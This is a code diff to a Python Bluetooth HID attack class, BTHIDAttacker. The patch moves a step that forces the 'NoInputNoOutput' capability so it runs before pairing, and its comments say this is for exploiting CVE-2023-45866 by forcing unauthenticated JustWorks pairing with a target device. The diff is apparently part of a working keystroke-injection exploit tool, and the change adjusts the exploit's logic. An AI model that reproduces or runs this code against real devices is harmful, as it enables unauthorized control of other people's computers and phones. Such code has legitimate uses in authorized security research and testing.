@@ -362,11 +362,19 @@ class BTHIDAttacker:
             proxy = await self._get_device_proxy(device_path)
             device_iface = proxy.get_interface("org.bluez.Device1")
             
+            # Force NoInputNoOutput capability BEFORE pairing for CVE-2023-45866 OTA
+            # This forces JustWorks pairing (no authentication)
+            try:
+                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Capabilities", 0x0000)  # NoInputNoOutput
+                logger.info("Set NoInputNoOutput capability for CVE-2023-45866 OTA")
+            except Exception as e:
+                logger.warning("Could not set NoInputNoOutput capability pre-pairing", error=str(e))
+            
             if self.target.paired:
                 logger.info("Already paired, connecting", address=self.target_address)
                 await device_iface.Connect()
             else:
-                logger.info("Pairing with target", address=self.target_address)
+                logger.info("Pairing with target (JustWorks/NoInputNoOutput)", address=self.target_address)
                 await device_iface.Pair()
                 # Wait for pairing
                 await asyncio.sleep(3)
@@ -396,12 +404,6 @@ class BTHIDAttacker:
                 )
             
             logger.info("Target connected", address=self.target_address)
-            
-            # Force NoInputNoOutput capability for CVE-2023-45866 OTA attack
-            try:
-                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Capabilities", 0x0000)  # NoInputNoOutput
-            except Exception as e:
-                logger.warning("Could not set NoInputNoOutput capability", error=str(e))
             
             return BTHIDResult(
                 success=True,
